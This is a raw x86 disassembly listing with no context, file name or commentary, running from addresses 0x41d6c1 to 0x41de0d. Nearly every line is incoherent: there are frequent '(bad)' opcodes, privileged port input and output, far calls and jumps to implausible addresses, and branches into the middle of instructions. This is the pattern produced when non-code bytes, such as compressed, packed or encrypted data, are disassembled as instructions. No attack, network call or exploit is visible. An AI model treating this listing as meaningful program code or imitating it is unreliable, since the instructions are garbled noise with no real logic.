  41d6c1:	mov    ds:0x7404d5bc,al
  41d6c6:	dec    ecx
  41d6c7:	inc    esp
  41d6c8:	call   0x7c7c85cc
  41d6cd:	nop
  41d6ce:	pop    edi
  41d6cf:	push   edx
  41d6d0:	loopne 0x41d70a
  41d6d2:	sub    bh,bl
  41d6d4:	pop    eax
  41d6d5:	add    ah,bl
  41d6d7:	sbb    eax,0x17ff5f6c
  41d6dc:	pop    esp
  41d6dd:	sub    eax,0x9bdb43a1
  41d6e2:	ins    BYTE PTR es:[di],dx
  41d6e4:	les    esi,FWORD PTR [ebp-0x2d]
  41d6e7:	jb     0x41d6df
  41d6e9:	fisubr DWORD PTR [esi-0x7a]
  41d6ec:	call   ebx
  41d6ee:	jbe    0x41d731
  41d6f0:	lock cmp al,0xd5
  41d6f3:	iret   
  41d6f4:	mov    eax,ds:0xc18185ea
  41d6f9:	push   eax
  41d6fa:	in     al,0xbf
  41d6fc:	jmp    0x3e6762ad
  41d701:	leave  
  41d702:	lea    esp,[edx]
  41d704:	dec    ebp
  41d705:	je     0x41d722
  41d707:	fsub   QWORD PTR [ebp+eax*4+0x78]
  41d70b:	cli    
  41d70c:	call   0x12ebc580
  41d711:	jl     0x41d788
  41d713:	inc    ebx
  41d714:	ret    
  41d715:	aaa    
  41d716:	int    0x2f
  41d718:	loopne 0x41d70f
  41d71a:	mov    ah,0xed
  41d71c:	jb     0x41d739
  41d71e:	jbe    0x41d798
  41d720:	inc    eax
  41d721:	test   DWORD PTR [ebx+0x78dd5bc0],esp
  41d727:	pop    ebx
  41d728:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d729:	dec    ecx
  41d72a:	imul   esi,eax,0xc31ef5a9
  41d730:	sub    BYTE PTR ds:0x3b483886,dl
  41d736:	jmp    0x41d74a
  41d738:	call   0xb5c65b38
  41d73d:	mov    WORD PTR [edi-0x4dc4e39e],fs
  41d743:	shl    DWORD PTR [eax+ebp*8],cl
  41d746:	push   ss
  41d747:	sar    ah,1
  41d749:	outs   dx,BYTE PTR ds:[esi]
  41d74a:	mov    ds:0xc1913620,eax
  41d74f:	cmp    esp,DWORD PTR [esi+0x30]
  41d752:	enter  0x7f3f,0xcd
  41d756:	fadd   DWORD PTR [edi+edx*1]
  41d759:	es and eax,0x7ab107ed
  41d75f:	imul   eax
  41d761:	leave  
  41d762:	adc    DWORD PTR [ebp+esi*2-0x77c612de],eax
  41d769:	and    al,0x63
  41d76b:	jmp    0x41d767
  41d76d:	pop    edx
  41d76e:	inc    edi
  41d76f:	inc    ebx
  41d770:	mov    al,0x9e
  41d772:	mov    eax,ds:0xebf2e7d2
  41d777:	in     al,0xe7
  41d779:	and    bh,BYTE PTR [esi-0x7be957b7]
  41d77f:	(bad)  
  41d780:	imul   ecx,DWORD PTR ds:0x66263f43,0x15
  41d787:	ficom  WORD PTR [edx+ebp*8]
  41d78a:	push   0xadc41e06
  41d78f:	clc    
  41d790:	ret    
  41d791:	or     edx,DWORD PTR [edx-0x38]
  41d794:	inc    ecx
  41d795:	inc    ecx
  41d796:	mov    bl,0x15
  41d798:	sub    al,0xf5
  41d79a:	or     BYTE PTR [eax-0x4fccd47d],bl
  41d7a0:	xchg   esp,eax
  41d7a1:	ins    DWORD PTR es:[edi],dx
  41d7a2:	and    ah,bl
  41d7a4:	xlat   BYTE PTR ds:[ebx]
  41d7a5:	stos   BYTE PTR es:[edi],al
  41d7a6:	or     edi,DWORD PTR [ecx-0x5fcbd2bd]
  41d7ac:	test   eax,0x5e373eb3
  41d7b1:	aam    0xba
  41d7b3:	lods   eax,DWORD PTR ds:[esi]
  41d7b4:	fst    QWORD PTR [ebx-0x21]
  41d7b7:	das    
  41d7b8:	adc    eax,0x94052ba1
  41d7bd:	sub    BYTE PTR [edi],bh
  41d7bf:	shr    edi,1
  41d7c1:	stos   DWORD PTR es:[edi],eax
  41d7c2:	push   es
  41d7c3:	leave  
  41d7c4:	inc    ecx
  41d7c5:	xor    DWORD PTR [esi],ebp
  41d7c7:	jecxz  0x41d79e
  41d7c9:	je     0x41d833
  41d7cb:	cld    
  41d7cc:	aas    
  41d7cd:	add    ebp,DWORD PTR [eax+0x6fae912c]
  41d7d3:	and    dl,BYTE PTR [ecx+0x6c6227e7]
  41d7d9:	adc    eax,0x3aefa236
  41d7de:	test   eax,0xa88bf138
  41d7e3:	ficom  WORD PTR [ecx+0xf41fcc4]
  41d7e9:	stos   BYTE PTR es:[edi],al
  41d7ea:	mov    bh,0x70
  41d7ec:	lods   eax,DWORD PTR ds:[esi]
  41d7ed:	stos   BYTE PTR es:[edi],al
  41d7ee:	addr16 cdq 
  41d7f0:	test   eax,0xd245cfc6
  41d7f5:	mov    esp,DWORD PTR [ebx+edi*2+0x530a746a]
  41d7fc:	add    DWORD PTR [edi+0x2d],edx
  41d7ff:	push   ecx
  41d800:	fmul   QWORD PTR [edi+0x6b]
  41d803:	fisttp DWORD PTR [edx-0x61884846]
  41d809:	mov    edi,0x9470c42e
  41d80e:	push   edx
  41d80f:	xor    ecx,DWORD PTR [edi-0x46]
  41d812:	pop    ebx
  41d813:	jb     0x41d869
  41d815:	popa   
  41d816:	into   
  41d817:	mov    al,ds:0x50c7c95a
  41d81c:	jmp    0x41d830
  41d81e:	and    DWORD PTR [ebx+0x6f],ebx
  41d821:	mov    es,WORD PTR [esi-0x69284c1b]
  41d827:	adc    BYTE PTR [ecx+eax*1-0x7d33ddb5],0x64
  41d82f:	fiadd  DWORD PTR [ecx-0x46c8d48e]
  41d835:	adc    DWORD PTR [edx+0x3e],ebp
  41d838:	fcmove st,st(3)
  41d83a:	popa   
  41d83b:	aad    0xb1
  41d83d:	cmp    dl,0xf4
  41d840:	push   esp
  41d841:	cdq    
  41d842:	mov    ah,0x15
  41d844:	mov    edi,0x996c0547
  41d849:	test   dl,bl
  41d84b:	ja     0x41d801
  41d84d:	and    edx,DWORD PTR [eax]
  41d84f:	retf   0x6e59
  41d852:	pop    es
  41d853:	stos   DWORD PTR es:[edi],eax
  41d854:	es addr16 js 0x41d8be
  41d858:	sub    esi,DWORD PTR [ecx]
  41d85a:	mov    DWORD PTR [esi+0x263d3007],ebp
  41d860:	cmp    DWORD PTR [esi+ebx*4+0x454ea751],ebx
  41d867:	stos   BYTE PTR es:[edi],al
  41d868:	dec    ecx
  41d869:	mov    al,0xab
  41d86b:	fs in  eax,0x2d
  41d86e:	lds    esi,FWORD PTR [ebx-0x51ebd5a7]
  41d874:	xchg   BYTE PTR [edi+esi*8+0x28],ah
  41d878:	clc    
  41d879:	in     al,dx
  41d87a:	mov    edi,0x9b9f0586
  41d87f:	fadd   st(7),st
  41d881:	pop    esp
  41d882:	mov    dl,BYTE PTR [esi-0x44076af8]
  41d888:	push   ebx
  41d889:	mov    bh,0x43
  41d88b:	ret    0x5a7b
  41d88e:	popf   
  41d88f:	push   edx
  41d890:	mov    ebx,0xe7a479ff
  41d895:	ret    0x6788
  41d898:	pop    esi
  41d899:	leave  
  41d89a:	imul   esi,DWORD PTR [eax+0x39],0x11
  41d89e:	xor    ch,BYTE PTR [ebx-0x25]
  41d8a1:	(bad)  [edi]
  41d8a3:	sti    
  41d8a4:	cli    
  41d8a5:	mov    bh,0xde
  41d8a7:	mov    ds:0xb57dadbf,al
  41d8ac:	pusha  
  41d8ad:	test   eax,0x687fbf5e
  41d8b2:	mul    eax
  41d8b4:	(bad)
  41d8b8:	and    edx,edx
  41d8ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8bb:	push   esp
  41d8bc:	xor    ebp,0xffffffc4
  41d8bf:	ret    
  41d8c0:	push   ds
  41d8c1:	clc    
  41d8c2:	or     ch,al
  41d8c4:	lds    ecx,FWORD PTR [eax-0xc]
  41d8c7:	ds imul esi,edi,0xa3fe4562
  41d8ce:	ins    BYTE PTR es:[edi],dx
  41d8cf:	sub    ah,BYTE PTR [edi-0x70c34708]
  41d8d5:	mul    DWORD PTR [eax+0x7cae9a5]
  41d8db:	sub    ch,BYTE PTR ds:0xcb7ada3c
  41d8e1:	inc    ecx
  41d8e2:	mov    WORD PTR ds:0x6261886b,cs
  41d8e8:	add    dh,bh
  41d8ea:	stc    
  41d8eb:	mul    DWORD PTR [ebp-0x1b]
  41d8ee:	pop    edi
  41d8ef:	mov    ah,0x72
  41d8f1:	loop   0x41d93c
  41d8f3:	pop    esi
  41d8f4:	inc    ebp
  41d8f5:	cmp    al,0xc
  41d8f7:	(bad)  
  41d8f9:	stos   DWORD PTR es:[edi],eax
  41d8fa:	add    DWORD PTR [eax-0xb],edx
  41d8fd:	(bad)  
  41d8fe:	cmp    DWORD PTR [edx-0x41],esi
  41d901:	lods   eax,DWORD PTR ds:[esi]
  41d902:	(bad)  
  41d903:	xor    esp,ecx
  41d905:	ds cld 
  41d907:	lods   al,BYTE PTR ds:[esi]
  41d908:	cmp    ch,BYTE PTR [ebp-0x6f]
  41d90b:	push   0xdcf960b4
  41d910:	mov    ebp,0xec4a2638
  41d915:	loope  0x41d94e
  41d917:	pop    eax
  41d918:	int    0x94
  41d91a:	stos   DWORD PTR es:[edi],eax
  41d91b:	fcomp  QWORD PTR [ecx]
  41d91d:	sar    BYTE PTR ds:0x3bd02223,cl
  41d923:	int3   
  41d924:	mov    dh,0x85
  41d926:	jbe    0x41d985
  41d928:	fidiv  WORD PTR ds:0x1825ac65
  41d92e:	pushf  
  41d92f:	sbb    BYTE PTR [esi+0x5d],cl
  41d932:	shr    ch,1
  41d934:	mov    edi,0x8f7403d5
  41d939:	cwde   
  41d93a:	pop    ss
  41d93b:	xor    al,0xbd
  41d93d:	out    dx,eax
  41d93e:	dec    ebx
  41d93f:	mov    BYTE PTR [esi-0x5d2024b0],0x8e
  41d946:	cli    
  41d947:	sti    
  41d948:	sub    BYTE PTR [edx+0x27],bh
  41d94b:	dec    esp
  41d94c:	cli    
  41d94d:	je     0x41d9c5
  41d94f:	mov    ebx,0xe0e076bb
  41d954:	add    ch,bh
  41d956:	mov    ch,0xf0
  41d958:	push   ss
  41d959:	xchg   ch,ah
  41d95b:	idiv   dl
  41d95d:	in     eax,dx
  41d95e:	sbb    BYTE PTR [esi-0x52],0xde
  41d962:	and    al,0x16
  41d964:	dec    edi
  41d965:	mov    dl,0xd7
  41d967:	lea    esp,[ebx+esi*2-0x679ccb8e]
  41d96e:	mov    bh,0xef
  41d970:	jmp    0x9eff78fc
  41d975:	jo     0x41d951
  41d977:	xor    DWORD PTR [ebx+0x6cd5380b],edx
  41d97d:	mov    DWORD PTR [ebx-0x5a7fe65],ecx
  41d983:	pop    ss
  41d984:	retf   
  41d985:	out    dx,eax
  41d986:	arpl   WORD PTR [eax+0x561110b],sp
  41d98c:	outs   dx,DWORD PTR ds:[esi]
  41d98d:	pop    ebp
  41d98e:	mov    DWORD PTR ds:0x2b7c95aa,ecx
  41d994:	xor    BYTE PTR gs:[ecx+edi*4+0x569019f1],bh
  41d99c:	call   0x51b1:0xabfe7270
  41d9a3:	retf   0x36a8
  41d9a6:	hlt    
  41d9a7:	sub    bl,bl
  41d9a9:	pop    esi
  41d9aa:	dec    edx
  41d9ab:	repz (bad) 
  41d9ad:	push   ecx
  41d9ae:	sahf   
  41d9af:	outs   dx,DWORD PTR ds:[esi]
  41d9b0:	rcl    ecx,cl
  41d9b2:	sub    dh,BYTE PTR [edi+0x754b8239]
  41d9b8:	fstp   TBYTE PTR [ebx+0x17]
  41d9bb:	jecxz  0x41d95b
  41d9bd:	rcr    BYTE PTR [ecx-0x60],0xcb
  41d9c1:	adc    al,0x89
  41d9c3:	dec    ebx
  41d9c4:	or     ch,BYTE PTR [edx]
  41d9c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9c7:	dec    ebx
  41d9c8:	jno    0x41da10
  41d9ca:	icebp  
  41d9cb:	scas   eax,DWORD PTR es:[edi]
  41d9cc:	nop
  41d9cd:	jo     0x41d9f6
  41d9cf:	mov    bl,0x70
  41d9d1:	dec    esi
  41d9d2:	pushf  
  41d9d3:	je     0x41d9a1
  41d9d5:	popf   
  41d9d6:	inc    eax
  41d9d7:	(bad)  
  41d9d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9d9:	mov    ch,0x19
  41d9db:	outs   dx,DWORD PTR ds:[esi]
  41d9dc:	loope  0x41d99b
  41d9de:	xchg   edi,eax
  41d9df:	pop    eax
  41d9e0:	lods   eax,DWORD PTR ds:[esi]
  41d9e1:	cvtdq2ps xmm3,XMMWORD PTR [edi-0x3d]
  41d9e5:	mov    eax,ds:0xe9dde6ae
  41d9ea:	stc    
  41d9eb:	jle    0x41d9cb
  41d9ed:	ja     0x41da53
  41d9ef:	adc    eax,0x31c97605
  41d9f4:	inc    esi
  41d9f5:	mov    esp,0x3e142097
  41d9fa:	or     al,0x23
  41d9fc:	push   edi
  41d9fd:	ins    BYTE PTR es:[edi],dx
  41d9fe:	jge    0x41d9ca
  41da00:	scas   al,BYTE PTR es:[edi]
  41da01:	mov    al,0x27
  41da03:	out    0xf8,eax
  41da05:	pop    ecx
  41da06:	or     eax,0xbe9453e3
  41da0b:	cdq    
  41da0c:	cwde   
  41da0d:	mov    ds:0xaa29b9bd,eax
  41da12:	fcomi  st,st(4)
  41da14:	jnp    0x41da24
  41da16:	sbb    eax,0xe580885d
  41da1b:	imul   DWORD PTR [esi-0x4b]
  41da1e:	in     eax,0x8b
  41da20:	das    
  41da21:	outs   dx,DWORD PTR ds:[esi]
  41da22:	jmp    edx
  41da24:	xor    dl,BYTE PTR [edi-0x2a]
  41da27:	dec    ebx
  41da28:	retf   0x58e1
  41da2b:	jbe    0x41d9cd
  41da2d:	or     ebx,DWORD PTR [edx+0x446d6aab]
  41da33:	push   es
  41da34:	push   edx
  41da35:	in     al,0x1b
  41da37:	iret   
  41da38:	mov    ch,0x15
  41da3a:	jmp    0x41daa9
  41da3c:	daa    
  41da3d:	xchg   esi,eax
  41da3e:	cmp    esi,ebx
  41da40:	aaa    
  41da41:	mov    ah,0x8e
  41da43:	push   0xffffff8f
  41da45:	(bad)  
  41da46:	sub    eax,0xbb2b56b4
  41da4b:	imul   eax,DWORD PTR [ebx],0x68d611b9
  41da51:	or     al,0xc3
  41da53:	dec    eax
  41da54:	inc    eax
  41da55:	or     BYTE PTR [ecx+0x69ab9cf2],ah
  41da5b:	into   
  41da5c:	shr    DWORD PTR [ebx+eax*2],0x9c
  41da60:	ds xor ah,ah
  41da63:	jo     0x41dacd
  41da65:	call   0x572c1de3
  41da6a:	push   0xbf38a55b
  41da6f:	sub    ah,BYTE PTR [ebx]
  41da71:	jno    0x41dab5
  41da73:	sar    BYTE PTR [edi],cl
  41da75:	inc    edx
  41da76:	out    dx,eax
  41da77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da78:	test   al,0xdc
  41da7a:	pop    edi
  41da7b:	and    eax,0xeb7dfb32
  41da80:	retf   
  41da81:	ret    0x990d
  41da84:	enter  0xb612,0xb0
  41da88:	cli    
  41da89:	ds scas al,BYTE PTR es:[edi]
  41da8b:	inc    ecx
  41da8c:	das    
  41da8d:	adc    esp,DWORD PTR [eax]
  41da8f:	push   esi
  41da90:	cmp    DWORD PTR [eax],edx
  41da92:	sbb    edi,esp
  41da94:	or     DWORD PTR [eax],ebp
  41da96:	nop
  41da97:	inc    ebx
  41da98:	mov    bh,0x98
  41da9a:	jo     0x41db19
  41da9c:	(bad)  
  41da9e:	add    eax,0x9996e106
  41daa3:	cld    
  41daa4:	out    dx,eax
  41daa5:	int3   
  41daa6:	cmp    ebp,esi
  41daa8:	add    ebx,DWORD PTR [esi]
  41daaa:	or     BYTE PTR [edx+0x109f97f3],dl
  41dab0:	mov    edi,0x7e4fc070
  41dab5:	sbb    ch,bl
  41dab7:	(bad)  
  41dab9:	sub    bh,BYTE PTR [edx+0x5c]
  41dabc:	add    al,cl
  41dabe:	test   BYTE PTR [esi-0xe],bl
  41dac1:	out    dx,eax
  41dac2:	cmp    al,BYTE PTR [ebp+0x1]
  41dac5:	mov    dh,0x5d
  41dac7:	push   esp
  41dac8:	jo     0x41dafb
  41daca:	mov    ah,0x9f
  41dacc:	or     al,BYTE PTR ds:0x19a0ccc
  41dad2:	mov    dh,0xea
  41dad4:	jmp    0x41db0e
  41dad6:	retf   0xa3a5
  41dad9:	jmp    0xe585027f
  41dade:	push   0xaccf7304
  41dae3:	jge    0x41db4c
  41dae5:	inc    ecx
  41dae6:	jmp    0x41dae6
  41dae8:	dec    ecx
  41dae9:	lods   al,BYTE PTR ds:[esi]
  41daea:	pop    eax
  41daeb:	(bad)  
  41daec:	mov    eax,0xc9758b36
  41daf1:	jb     0x41da7d
  41daf3:	nop
  41daf4:	inc    esi
  41daf5:	les    esp,FWORD PTR [esi]
  41daf7:	das    
  41daf8:	cdq    
  41daf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dafa:	add    bh,BYTE PTR [edx]
  41dafc:	popa   
  41dafd:	lods   eax,DWORD PTR ds:[esi]
  41dafe:	cmp    bl,bl
  41db00:	cld    
  41db01:	je     0x41db0d
  41db03:	cld    
  41db04:	mov    ch,0xe1
  41db06:	arpl   WORD PTR ds:0xebeef3cd,di
  41db0c:	mov    ebp,0xd70c8fdd
  41db11:	arpl   WORD PTR [ecx+ebp*2-0x76871e16],bp
  41db18:	into   
  41db19:	jecxz  0x41daa9
  41db1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db1c:	dec    esi
  41db1d:	clc    
  41db1e:	or     DWORD PTR [eax+0x4d0c14d7],eax
  41db24:	shr    BYTE PTR [esi+0x18],1
  41db27:	jnp    0x41db13
  41db29:	cwde   
  41db2a:	pop    ebp
  41db2b:	xchg   BYTE PTR [esp+ebx*2+0x68b3c56f],al
  41db32:	stos   BYTE PTR es:[edi],al
  41db33:	xchg   esp,eax
  41db34:	push   ebx
  41db35:	sub    DWORD PTR [ebp+0x4e15d143],0xffffffb2
  41db3c:	adc    BYTE PTR ds:0x944ba01,0xe1
  41db43:	(bad)  
  41db44:	lock pushf 
  41db46:	fdiv   st(3),st
  41db48:	lods   al,BYTE PTR ds:[esi]
  41db49:	mov    al,0xde
  41db4b:	push   edi
  41db4c:	push   0x8f954aae
  41db51:	jae    0x41db7b
  41db53:	fnstsw WORD PTR [eax+esi*4+0x23]
  41db57:	pop    ecx
  41db58:	pop    ebp
  41db59:	lods   al,BYTE PTR ds:[esi]
  41db5a:	pop    ebx
  41db5b:	push   esi
  41db5c:	jo     0x41dbba
  41db5e:	fmulp  st(0),st
  41db60:	pop    eax
  41db61:	jo     0x41db2e
  41db63:	mov    ebx,0xe4f2739b
  41db68:	and    bh,BYTE PTR [esi*4+0x30b5247e]
  41db6f:	stos   BYTE PTR es:[edi],al
  41db70:	xor    eax,0xd0bd16a7
  41db75:	nop
  41db76:	je     0x41db60
  41db78:	bound  ebp,QWORD PTR [esi+0x209adc7e]
  41db7e:	out    0xe5,al
  41db80:	sub    ebp,DWORD PTR [ebx]
  41db82:	push   esi
  41db83:	stc    
  41db84:	mov    dh,0x9e
  41db86:	jbe    0x41db5b
  41db88:	imul   eax,edx,0x4a3e69d4
  41db8e:	pop    edx
  41db8f:	xor    dl,ah
  41db91:	push   edx
  41db92:	repnz cld 
  41db94:	or     DWORD PTR [ecx],ebp
  41db96:	mov    DWORD PTR [ebp-0x65],edi
  41db99:	popa   
  41db9a:	xchg   esi,eax
  41db9b:	dec    edx
  41db9c:	adc    BYTE PTR [edi+edi*4+0x6],bl
  41dba0:	xchg   edx,eax
  41dba1:	mov    esi,0x63e7fa56
  41dba6:	pop    ebx
  41dba7:	gs pop ebp
  41dba9:	imul   esp,DWORD PTR [edi],0x43f64f7f
  41dbaf:	lods   eax,DWORD PTR ds:[esi]
  41dbb0:	idiv   bh
  41dbb2:	push   ecx
  41dbb3:	mov    dh,0x2e
  41dbb5:	sub    bh,BYTE PTR [eax]
  41dbb7:	add    BYTE PTR [esi-0x13216a95],0x75
  41dbbe:	repnz loopne 0x41dbe5
  41dbc1:	icebp  
  41dbc2:	pop    esp
  41dbc3:	mov    ecx,ebx
  41dbc5:	(bad)  [ecx]
  41dbc7:	out    0x80,eax
  41dbc9:	leave  
  41dbca:	cmp    BYTE PTR [esi],al
  41dbcc:	gs sahf 
  41dbce:	cs cmp eax,0x3f6589b3
  41dbd4:	sbb    al,ch
  41dbd6:	fs mov dh,bh
  41dbd9:	sbb    DWORD PTR gs:[eax],edx
  41dbdc:	sbb    edx,DWORD PTR [esi-0x57]
  41dbdf:	pop    ebp
  41dbe0:	mov    cl,0x10
  41dbe2:	jnp    0x41dbb0
  41dbe4:	mov    es,WORD PTR [eax]
  41dbe6:	mov    ecx,DWORD PTR [ebp+0x21]
  41dbe9:	sbb    al,0xc6
  41dbeb:	pop    edx
  41dbec:	pop    esp
  41dbed:	mov    eax,0x11b411e9
  41dbf2:	cdq    
  41dbf3:	shl    DWORD PTR [ebp+0x7f9d1167],1
  41dbf9:	lods   al,BYTE PTR ds:[esi]
  41dbfa:	retf   0x7c52
  41dbfd:	ins    BYTE PTR es:[edi],dx
  41dbfe:	into   
  41dbff:	push   0xf
  41dc01:	xor    edi,DWORD PTR [esi]
  41dc03:	dec    ecx
  41dc04:	mov    ecx,0x673a1dea
  41dc09:	inc    esp
  41dc0a:	push   edi
  41dc0b:	inc    ecx
  41dc0c:	cld    
  41dc0d:	mov    ds:0xa5c511d4,al
  41dc12:	xchg   ebx,eax
  41dc13:	jl     0x41dc78
  41dc15:	or     ebp,0x13
  41dc18:	lds    eax,FWORD PTR [edx+0x8]
  41dc1b:	into   
  41dc1c:	push   edx
  41dc1d:	cmp    DWORD PTR [eax],esi
  41dc1f:	je     0x41dc4e
  41dc21:	enter  0x3aa0,0x35
  41dc25:	out    0xd6,al
  41dc27:	(bad)  
  41dc28:	iret   
  41dc29:	and    dl,0x44
  41dc2c:	inc    ebx
  41dc2d:	clc    
  41dc2e:	jge    0x41dc2b
  41dc30:	and    DWORD PTR [ebp-0x3f],0x432550d1
  41dc37:	dec    esi
  41dc38:	add    edi,DWORD PTR [ebp+0x4db3d389]
  41dc3e:	pop    edi
  41dc3f:	icebp  
  41dc40:	loop   0x41dcbe
  41dc42:	stos   BYTE PTR es:[edi],al
  41dc43:	lea    ecx,[eax-0x1fac66b3]
  41dc49:	jge    0x41dc52
  41dc4b:	lods   al,BYTE PTR ds:[esi]
  41dc4c:	xchg   edi,eax
  41dc4d:	mov    eax,0x5cd2c07f
  41dc52:	into   
  41dc53:	test   DWORD PTR [edi],esp
  41dc55:	mov    al,0x87
  41dc57:	pop    esi
  41dc58:	add    cl,bh
  41dc5a:	les    edx,FWORD PTR [edx]
  41dc5c:	lods   eax,DWORD PTR ds:[esi]
  41dc5d:	push   0xff3f861c
  41dc62:	mov    dl,0xb9
  41dc64:	push   es
  41dc65:	dec    ecx
  41dc66:	call   0xc395ee62
  41dc6b:	repz jl 0x41dc9b
  41dc6e:	or     ecx,DWORD PTR [edi-0x741b0a05]
  41dc74:	push   ds
  41dc75:	xchg   DWORD PTR [edi+0x5],edi
  41dc78:	inc    ebx
  41dc79:	shl    BYTE PTR ds:[ebx],1
  41dc7c:	sub    BYTE PTR [eax+0x7da226ba],dl
  41dc82:	sahf   
  41dc83:	jle    0x41dc44
  41dc85:	cmp    ebx,DWORD PTR [esi]
  41dc87:	ds mov ebx,0x6bc6a19c
  41dc8d:	into   
  41dc8e:	sbb    al,0x95
  41dc90:	jge    0x41dc66
  41dc92:	push   ebx
  41dc93:	imul   ebp,DWORD PTR [ebx+0x43],0xffffffb4
  41dc97:	pushf  
  41dc98:	mov    dx,0xa6ee
  41dc9c:	imul   esi,ebp,0x8e78304c
  41dca2:	add    BYTE PTR [edx+edi*8+0x637c91b3],dl
  41dca9:	lods   eax,DWORD PTR ds:[esi]
  41dcaa:	sub    eax,0x75b95838
  41dcaf:	add    DWORD PTR [ecx],ebx
  41dcb1:	hlt    
  41dcb2:	stos   DWORD PTR es:[edi],eax
  41dcb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dcb4:	and    al,0x10
  41dcb6:	or     bh,BYTE PTR [ecx+0x61ab547a]
  41dcbc:	fdivr  DWORD PTR [edx+0x40347edc]
  41dcc2:	rcl    bh,cl
  41dcc4:	imul   DWORD PTR [edx]
  41dcc6:	jbe    0x41dc66
  41dcc8:	or     al,0xb5
  41dcca:	xchg   edx,eax
  41dccb:	or     eax,0xf85208af
  41dcd0:	mov    edi,0x9fd1663c
  41dcd5:	ret    0x5272
  41dcd8:	repz pusha 
  41dcda:	in     al,0x25
  41dcdc:	jg     0x41dc9a
  41dcde:	stos   BYTE PTR es:[edi],al
  41dcdf:	mov    esp,0xc9f9fed1
  41dce4:	ss cmps DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41dce7:	lods   al,BYTE PTR ds:[esi]
  41dce8:	sahf   
  41dce9:	push   0xffffffa9
  41dceb:	push   ds
  41dcec:	add    dl,BYTE PTR [ecx-0xdc1e92a]
  41dcf2:	dec    ecx
  41dcf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dcf4:	jecxz  0x41dca9
  41dcf6:	jl     0x41dd49
  41dcf8:	int    0xdb
  41dcfa:	in     eax,0xfe
  41dcfc:	aaa    
  41dcfd:	pop    esp
  41dcfe:	inc    eax
  41dcff:	xor    BYTE PTR [ecx],cl
  41dd01:	mov    edi,0xe29b6d51
  41dd06:	dec    DWORD PTR [esi-0x4c]
  41dd09:	xchg   ebp,edx
  41dd0b:	xchg   ebp,eax
  41dd0c:	inc    ecx
  41dd0d:	test   BYTE PTR [ecx-0x1e],0x8a
  41dd11:	aaa    
  41dd12:	xchg   ebp,eax
  41dd13:	mov    bh,0x58
  41dd15:	cmp    esi,DWORD PTR ds:0x19144784
  41dd1b:	jb     0x41dce5
  41dd1d:	shl    BYTE PTR [ebx-0x6d],1
  41dd20:	(bad)  
  41dd21:	in     eax,dx
  41dd22:	mov    bh,0xa5
  41dd24:	retf   
  41dd25:	jmp    DWORD PTR [ebx]
  41dd27:	cmp    ah,BYTE PTR [ecx]
  41dd29:	cs mov bh,0xe2
  41dd2c:	fsub   DWORD PTR [eax+0x683dd885]
  41dd32:	retf   
  41dd33:	stos   BYTE PTR es:[edi],al
  41dd34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd35:	bound  esp,QWORD PTR [edx+0x46]
  41dd38:	push   ss
  41dd39:	jmp    0xa205da99
  41dd3e:	and    esp,DWORD PTR [edx]
  41dd40:	dec    esp
  41dd41:	and    al,BYTE PTR [ebx-0x1e]
  41dd44:	mov    al,ds:0x26382458
  41dd49:	mov    ch,bh
  41dd4b:	mov    ebp,0xcb02ebb0
  41dd50:	xchg   edi,eax
  41dd51:	push   esp
  41dd52:	mov    esi,0xcf0a5452
  41dd57:	lea    ebx,[edi-0x69]
  41dd5a:	sbb    DWORD PTR [eax+ecx*4-0x73],ebx
  41dd5e:	or     esp,ebp
  41dd60:	mov    cl,0xf1
  41dd62:	jge    0x41ddcf
  41dd64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd65:	fisttp DWORD PTR [ebx+0x68]
  41dd68:	jbe    0x41dd25
  41dd6a:	call   0xc8b751bc
  41dd6f:	jo     0x41dd30
  41dd71:	or     DWORD PTR [edi-0x28bd2459],0x18
  41dd78:	cdq    
  41dd79:	xor    al,0xc1
  41dd7b:	mov    esi,0x485c9c06
  41dd80:	and    dh,ah
  41dd82:	fmulp  st(5),st
  41dd84:	stos   BYTE PTR es:[edi],al
  41dd85:	out    0x49,al
  41dd87:	cmp    BYTE PTR [ebp+0x75c6e005],cl
  41dd8d:	shr    BYTE PTR [eax+0x2d],0xd3
  41dd91:	data16 ja 0x41ddbe
  41dd94:	sahf   
  41dd95:	fistp  DWORD PTR [ecx+0x62]
  41dd98:	adc    dl,cl
  41dd9a:	neg    DWORD PTR [ebx+ecx*8+0x7fa29718]
  41dda1:	sbb    DWORD PTR [edi-0x31b36225],ebp
  41dda7:	inc    ebp
  41dda8:	add    DWORD PTR [ebx-0x729e5169],0x94c14501
  41ddb2:	loop   0x41ddf4
  41ddb4:	xchg   ebp,eax
  41ddb5:	cmp    eax,0x120f5512
  41ddba:	mov    bh,0xf7
  41ddbc:	loopne 0x41de2b
  41ddbe:	outs   dx,BYTE PTR ds:[esi]
  41ddbf:	ins    BYTE PTR es:[edi],dx
  41ddc0:	cli    
  41ddc1:	fwait
  41ddc2:	xor    eax,0xb98ee9c6
  41ddc7:	pop    esi
  41ddc8:	inc    edi
  41ddc9:	stc    
  41ddca:	mov    ds:0x5584bb9b,al
  41ddcf:	(bad)  
  41ddd0:	sbb    eax,0x82dee426
  41ddd5:	pop    DWORD PTR [esi]
  41ddd7:	jne    0x41ddc9
  41ddd9:	jo     0x41de10
  41dddb:	mov    esp,esi
  41dddd:	mov    al,al
  41dddf:	and    ah,ah
  41dde1:	sub    bh,ah
  41dde3:	pop    es
  41dde4:	mov    ds:0x3a00953b,al
  41dde9:	xchg   edi,eax
  41ddea:	iret   
  41ddeb:	fstp   st(5)
  41dded:	icebp  
  41ddee:	leave  
  41ddef:	push   ebp
  41ddf0:	rol    DWORD PTR [esi+ebx*1],1
  41ddf3:	iret   
  41ddf4:	mov    al,0xc1
  41ddf6:	xchg   esi,eax
  41ddf7:	outs   dx,DWORD PTR ds:[esi]
  41ddf8:	shl    DWORD PTR [ecx-0x24],1
  41ddfb:	in     al,0x73
  41ddfd:	mov    al,ds:0x67919a0d
  41de02:	mov    ebx,0x8e772f00
  41de07:	cmp    BYTE PTR [ebp+0x77d9b1d4],dl
  41de0d:	sahf   
